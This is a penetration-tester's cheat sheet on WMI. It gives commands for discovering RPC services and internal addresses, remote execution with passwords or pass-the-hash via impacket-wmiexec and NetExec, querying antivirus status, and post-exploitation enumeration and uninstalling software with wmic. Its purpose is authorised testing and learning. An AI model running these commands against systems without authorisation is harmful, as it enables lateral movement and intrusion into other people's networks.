# WMI
```table-of-contents
```
## Discovery & Enumeration (No Creds)
```shell
# Nmap - Discovery
nmap -p 135 -sV -sC <IP>

# Impacket - RPC Dump
# Lists all registered RPC interfaces (UUIDs) and their ports.
# Helpful to verify if Exchange or other specific apps are running.
impacket-rpcdump @<IP> -port 135

# IOXIDResolver (Dual-Homed check)
# CRITICAL: Can reveal internal IP addresses (secondary NICs) of the target.
# Great for pivoting.
./IOXIDResolver.py -t <IP>
```
## Remote Execution (With Creds)
### Impacket (wmiexec)
```shell
# Login with Password
# Syntax: domain/user:password@IP
impacket-wmiexec <USER>:<PASS>@<IP>

# Login with Hash (Pass-The-Hash)
impacket-wmiexec <USER>@<IP> -hashes <LM>:<NT>
```
### NetExec (Mass Execution)
```shell
# Check if WMI is accessible
nxc wmi <IP> -u <USER> -p <PASS>

# Execute Command
nxc wmi <IP> -u <USER> -p <PASS> -x "whoami"
```
## Remote Enumeration (WMI Query)
```shell
# Impacket - WMI Query
# Get OS Version
impacket-wmiquery <USER>:<PASS>@<IP> -c "SELECT Caption, Version FROM Win32_OperatingSystem"

# Get AV/Defender Status
impacket-wmiquery <USER>:<PASS>@<IP> -c "SELECT * FROM AntiVirusProduct"
```
## Post-Exploitation (Local wmic)
```powershell
# System Info
wmic os get Caption,CSDVersion,OSArchitecture,InstallDate

# List Installed Updates (Patch Level)
wmic qfe get HotFixID,InstalledOn

# List Installed Software
wmic product get name,version

# Uninstall Software (Dangerous)
wmic product where name="BadApp" call uninstall

# List Running Services
wmic service list brief

# Process List
wmic process list brief
```